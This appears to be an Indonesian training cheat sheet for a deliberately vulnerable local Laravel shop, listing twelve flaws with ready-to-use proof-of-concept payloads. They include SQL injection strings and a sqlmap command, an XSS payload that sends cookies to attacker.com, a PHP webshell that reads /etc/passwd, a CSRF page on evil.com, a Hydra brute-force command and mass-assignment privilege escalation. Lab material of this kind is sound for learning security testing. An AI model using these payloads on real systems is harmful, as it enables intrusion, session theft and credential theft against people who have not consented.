# 🎯 Vulnerable Lab — Cheat Sheet Bug Hunting
**Toko Pak Budi — Intentionally Vulnerable E-Commerce**

> Jalankan: `php artisan serve` → buka `http://127.0.0.1:8000`

---

## Vuln #1 — SQL Injection
| | |
|---|---|
| **Endpoint** | `GET /products?search=PAYLOAD` |
| **Tipe** | Error-based, UNION-based |
| **PoC Basic** | `' OR '1'='1` |
| **PoC UNION** | `' UNION SELECT 1,email,password,4,5,6 FROM users-- -` |
| **Otomatis** | `sqlmap -u "http://127.0.0.1:8000/products?search=test" --dbs --batch` |

---

## Vuln #2 — XSS (Reflected + Stored)
| | |
|---|---|
| **Reflected** | `GET /products?search=<script>alert('XSS')</script>` |
| **Stored (nama produk)** | `<img src=x onerror=alert(document.cookie)>` |
| **Stored (deskripsi)** | `<script>fetch('http://attacker.com/?c='+document.cookie)</script>` |
| **Lokasi** | `/products`, `/products/{id}`, `/cart` |

---

## Vuln #3 — IDOR (Insecure Direct Object Reference)
| | |
|---|---|
| **Order IDOR** | Login User A → akses `GET /order/1` (milik User B) |
| **Cart IDOR** | `POST /cart/remove/1` → hapus cart user lain |
| **Dump semua order** | `GET /orders` → semua order semua user tampil |
| **Cara exploit** | Enumerate ID: `/order/1`, `/order/2`, `/order/3`, ... |

---

## Vuln #4 — Broken Access Control
| | |
|---|---|
| **Endpoint** | `GET /admin/products/create` |
| **Syarat** | Cukup login, tidak perlu role admin |
| **Aksi** | Tambah, edit, hapus produk sebagai user biasa |
| **PoC hapus** | `DELETE /admin/products/1` |

---

## Vuln #5 — Mass Assignment
| | |
|---|---|
| **Endpoint** | `POST /register` atau `POST /admin/products` |
| **PoC** | Kirim field tambahan: `is_admin=1&role=admin&user_id=1` |
| **Tools** | Burp Suite Repeater / curl |

---

## Vuln #6 — Insecure File Upload (Webshell)
| | |
|---|---|
| **Endpoint** | `POST /admin/products` (field: `image`) |
| **PoC** | Upload `shell.php` isi: `<?php system($_GET['cmd']); ?>` |
| **Akses shell** | `http://127.0.0.1:8000/storage/products/shell.php?cmd=whoami` |
| **RCE** | `?cmd=cat /etc/passwd` atau `?cmd=ls -la` |

---

## Vuln #7 — Price Manipulation
| | |
|---|---|
| **Endpoint** | `POST /checkout` |
| **PoC Burp** | Intercept POST, ubah `total_price=1` di body |
| **PoC DevTools** | Di `/cart`, buka DevTools → ubah value hidden field `total_price` |

---

## Vuln #8 — Negative Quantity
| | |
|---|---|
| **Endpoint** | `POST /cart/{product_id}` |
| **PoC negatif** | Body: `quantity=-100` → stok naik ilegal setelah checkout |
| **PoC overflow** | Body: `quantity=999999` → beli melebihi stok |

---

## Vuln #9 — CSRF
| | |
|---|---|
| **Endpoint** | `POST /cart/remove/{id}` (tidak ada `@csrf`) |
| **PoC** | Buat halaman HTML di domain lain: |

```html
<!-- Hosted di evil.com -->
<form method="POST" action="http://127.0.0.1:8000/cart/remove/1">
  <input type="submit" value="Klik untuk hadiah!">
</form>
<script>document.forms[0].submit();</script>
```

---

## Vuln #10 — Sensitive Data Exposure
| | |
|---|---|
| **Endpoint** | `GET /api/debug` — **tanpa auth!** |
| **Data bocor** | Semua user + password hash, APP_KEY, DB password, `$_SERVER` |
| **Endpoint 2** | `GET /api/debug/orders` — semua order + email user |
| **PoC** | `curl http://127.0.0.1:8000/api/debug` |

---

## Vuln #11 — Brute Force (No Rate Limiting)
| | |
|---|---|
| **Endpoint** | `POST /login` |
| **PoC Hydra** | `hydra -l admin@test.com -P rockyou.txt 127.0.0.1 http-post-form "/login:email=^USER^&password=^PASS^:These credentials"` |
| **PoC Burp** | Gunakan Intruder → Sniper pada field `password` |

---

## Vuln #12 — Information Disclosure
| | |
|---|---|
| **APP_DEBUG=true** | Stack trace Laravel terbuka saat error |
| **PoC** | `GET /products/99999999` → full stack trace dengan file path |
| **Response header** | Server header bocorkan versi PHP & Laravel |

---

## 🗂️ Urutan Rekomendasi Latihan

```
1. Recon     → /api/debug (dapatkan semua user + credentials)
2. SQLi      → /products?search= (dump database)
3. IDOR      → /order/1,2,3... (baca order user lain)
4. File Upload → /admin/products (upload webshell → RCE)
5. XSS       → Stored via nama produk
6. Priv Esc  → Mass assignment saat register
7. Logic Bug → Price manipulation saat checkout
```

---

*🔴 Hanya untuk lab lokal. Jangan deploy ke server publik!*
